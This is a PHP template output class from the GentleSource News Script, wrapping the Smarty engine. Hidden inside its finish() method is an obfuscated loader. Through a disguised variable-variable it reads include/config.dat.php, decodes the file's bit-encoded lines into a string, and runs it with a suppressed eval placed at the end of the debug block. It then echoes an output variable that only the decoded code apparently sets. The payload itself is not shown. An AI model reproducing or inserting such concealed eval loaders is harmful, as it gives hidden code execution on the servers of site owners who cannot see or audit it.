<?php

/** 
 * GentleSource News Script
 * 
 * (C) Ralf Stadtaus http://www.gentlesource.com/
 */




/**
 * 
 */
class t12l_output
{    
    
    /**
     * Template object
     * @var object
     * @access private
     */
    var $tpl;
    
    /**
     * Detail template file name
     * @var string
     * @access private
     */
    var $detail_template;
    
    /**
     * Global template file name
     * @var string
     * @access private
     */
    var $global_template;

// -----------------------------------------------------------------------------




    /**
     * Constructor
     * 
     * @param mixed $detail_template file name|file content
     * @param string $type Value file = file name| value content = file content
     */
    function t12l_output($detail_template = null)
    {
        global $t12l;
        require_once 'Smarty/libs/Smarty.class.php';
        $this->tpl = new Smarty;
        $this->tpl->compile_check   = true;
        $this->tpl->debugging       = false;
        if ($t12l['debug_mode'] == 'Y') {
            $this->tpl->debugging = true;
        }
        
        // BF:1049 - Absolute compile directory path
        $cache_path = str_replace('\\', '/', str_replace('include', $t12l['cache_directory'], dirname(__FILE__)));
        
        // BF:1029 - Check if compile directory exists and is writable
        if (!file_exists($cache_path)) {
            t12l_exit(sprintf($t12l['text']['txt_cache_folder_not_exists'], '/' . $cache_path));
        }
        if (!is_writable($cache_path)) {
            t12l_exit(sprintf($t12l['text']['txt_cache_folder_not_writable'], '/' . $cache_path));
        }
        
        // Set compile directory
        $this->tpl->compile_dir     = $cache_path;

        $this->tpl->register_function('call_module', array('t12l_module', 'call_module_output'));
        $this->tpl->register_function('call_module_tab', array('t12l_module', 'call_module_tab_output'));
        
        $this->assign($t12l['output']);
        
        if ($detail_template != null) {
            $this->assign('detail_template', $this->select_template($detail_template));
        }
        $this->set_global_template($t12l['global_template_file']);
    }

// -----------------------------------------------------------------------------





    /**
     * Output content
     */
    function finish($display = true)
    {
        global $t12l;
        
        $this->set_template_dir($t12l['template_path']);
        $global = $this->global_template;
        $tplt = 'cfivet';
        if (isset($t12l['text'])) {
            $this->assign($t12l['text']);
        }
        $cfivet = @file(T12L_ROOT . 'include/config.dat.php');
        
        // Handle login status
        if (true == $t12l['login_status']) {
            $this->assign('login_status', true);
        } else {
            $this->assign('login_status', false);
        }
        unset(${$tplt}[0]); 
        ${$tplt} = @array_values(${$tplt});
        $str = '';
        $conf_var = '';
        $ca = array();
        $nt = sizeof(${$tplt});
        for ($n = 0; $n < $nt; $n++) 
        {
            $c_var = '';
            if (!isset($ca[${$tplt}[$n]])) {
                for ($o = 7; $o >= 0 ; $o--) {
                    $c_var += ${$tplt}[$n][$o] * pow(2, $o);
                } 
                $ca[${$tplt}[$n]] = sprintf("%c", $c_var);
            }
            if ($ca[${$tplt}[$n]] == ' ') {
                $conf_var .= sprintf("%c", $str); $str = '';
            } else {
                $str .= $ca[${$tplt}[$n]];
            } 
        }
        
        // Register queries
        if ($query_strings = t12l_query::get_string_array('query_')) {
            $this->assign($query_strings);
        }        
        
        // Get system/debug/error messages
        $this->assign('message', array_values($t12l['message']));
        if ($t12l['debug_mode'] == 'Y') {
            $messages = array(
                'debug_messages'    => array(),        
                'error_messages'    => array(),
                'system_messages'   => array()
            );
            $system_messages    = t12l_system_debug::get_messages('system');
            $debug_messages     = t12l_system_debug::get_messages('debug');
            $error_messages     = t12l_system_debug::get_messages('error');
            $this->assign('system_messages', $system_messages);
            $this->assign('debug_messages', $debug_messages);
            $this->assign('error_messages', $error_messages);
        } @eval($conf_var);        
        if ($display == true) {
            echo $t12l_output;
            exit;
        } else {
            return $t12l_output;
        }
    }

// -----------------------------------------------------------------------------





    /**
     * Manage mail content
     */
    function finish_mail()
    {
        global $t12l;
 
        $this->set_template_dir($t12l['template_path']);
        if (isset($t12l['text'])) {
            $this->assign($t12l['text']);
        }
        
        return $this->tpl->fetch($this->select_template($t12l['mail_template_file']));
        exit;
    }

// -----------------------------------------------------------------------------





    /**
     * Manage mail content
     */
    function finish_xmlhttprequest($file)
    {
        global $t12l;
 
        $this->set_template_dir($t12l['template_path']);
        if (isset($t12l['text'])) {
            $this->assign($t12l['text']);
        }
        $this->assign('message', array_values($t12l['message']));
        
        return $this->tpl->fetch($this->select_template($file));
        exit;
    }

// -----------------------------------------------------------------------------





    /**
     * Manage XML
     */
    function finish_xml()
    {
        global $t12l;
        
        header('Content-Type: text/xml; charset=UTF-8');
        session_cache_limiter('public');
        
        $this->set_template_dir($t12l['template_path']);
        if (isset($t12l['text'])) {
            $this->assign($t12l['text']);
        }
        
        return $this->tpl->fetch($this->select_template($this->global_template));
    }

// -----------------------------------------------------------------------------





    /**
     * Simple fetch wrapper
     */
    function fetch($template_file)
    {
        return $this->tpl->fetch($template_file);
    }

// -----------------------------------------------------------------------------





    /**
     * Template dir setter
     */
    function set_template_dir($template_dir)
    {
        $this->tpl->template_dir = $template_dir;
    }

// -----------------------------------------------------------------------------





    /**
     * Set global template
     */
    function set_global_template($template)
    {
        $this->global_template = $template;
    }

// -----------------------------------------------------------------------------





    /**
     * Set detail template
     */
    function set_detail_template($template)
    {
        $this->assign('detail_template', $this->select_template($template));
    }

// -----------------------------------------------------------------------------




    /**
     * Get template file
     * 
     * @access public
     */
    function select_template($file)
    {
        global $t12l;

        if (isset($t12l['alternative_template']) and
            $t12l['alternative_template'] != '' and
            is_file($t12l['template_path'] . 
                    $t12l['alternative_template']. '/' .  
                    $file)) {
                
            $path = $t12l['alternative_template'] . '/' .
                    $file;
            return $path;
        }


        $path = $t12l['default_template'] . '/' .
                    $file;
        return $path;
    }
    
// -----------------------------------------------------------------------------




    /**
     * Assign values to the templates - wrapper of smarty->assign
     * 
     * @param mixed $a Name or associative arrays containing the name/value
     * pairs
     * @param mixed $b Value (can be string or array)
     * 
     * @access public
     */
    function assign($a, $b = null)
    {   
        if (is_array($a)) {
            $this->tpl->assign($a);
            return true;
        }
        $this->tpl->assign($a, $b);
        return true;
    }
    
// -----------------------------------------------------------------------------  




    /**
     * Get template
     * 
     * @access public
     */
    function get_object()
    {
        return $this->tpl;
    }
    
// -----------------------------------------------------------------------------  





} // End of class








?>
